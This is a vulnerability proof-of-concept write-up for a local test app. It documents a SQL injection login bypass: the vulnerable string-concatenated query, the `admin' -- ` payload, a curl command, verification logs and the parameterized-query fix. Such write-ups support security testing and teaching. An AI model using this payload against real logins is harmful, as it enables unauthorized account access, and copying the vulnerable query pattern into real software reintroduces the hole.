# PoC: SQL Injection — Login Bypass

## Location
`POST /login` in `app.py`

## Root cause
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```
User input is concatenated directly into the SQL string instead of using
parameterized queries.

## Exploitation

Submit the login form with:

- **Username:** `admin' -- `
- **Password:** (anything)

Resulting query:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
```
The `--` comments out the password check entirely, so the query returns the
`admin` row regardless of the password supplied.

### curl
```bash
curl -c cookies.txt -X POST http://127.0.0.1:5000/login \
  -d "username=admin' -- " -d "password=anything"
```
A `302` redirect to `/profile` with a valid session cookie confirms the bypass.

## Impact
Full authentication bypass — an attacker can log in as any user, including
`admin`, without knowing any password.

## Verified

Reproduced locally against the `vulnerable` branch (port 5000):

```
POST /login HTTP/1.1   (username=admin' --  , password=<anything>)
-> 302 redirect
GET /profile?employee_id=3 HTTP/1.1
-> 200 (admin's profile, no password required)
```

Also confirmed that an imprecise payload (e.g. missing the trailing space
after `--`) instead throws a `sqlite3.OperationalError: near "...": syntax
error` (HTTP 500) — itself a useful error-based confirmation that the input
reaches the SQL parser unescaped, before adjusting the payload to achieve a
full bypass.

Re-tested against the `patched` branch (port 5001): the same payload returns
`Invalid username or password.` (HTTP 200, login rejected).

## Fix (see `patched` branch)
Use parameterized queries:
```python
cur = db.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, password),
)
```
This ensures user input is always treated as data, never as part of the SQL
syntax. Additionally, the `patched` branch stores password hashes (e.g. with
`werkzeug.security.generate_password_hash`) instead of plaintext.
